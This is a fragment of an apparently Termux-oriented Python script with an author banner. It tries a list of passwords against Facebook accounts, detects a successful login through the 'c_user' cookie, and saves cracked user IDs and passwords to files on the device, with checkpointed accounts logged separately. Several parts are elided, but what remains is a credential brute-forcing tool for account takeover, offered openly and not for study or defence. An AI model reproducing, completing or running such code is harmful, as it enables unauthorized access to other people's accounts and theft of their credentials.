...
\033[0;93m
╔══════════════════════════════════════════╗🖤"
║Author            : AHSAM UL HAQ JOIYA 
║FB Group          : MR AUH TERMUX HELPING ZONE 
║Facebook          : AHSAM UL HAQ 
║Version           : 3.0                        
╚══════════════════════════════════════════╝💔"\033[1;31m
    """) 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/H4XOR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/AHSAM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}AHSAM{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
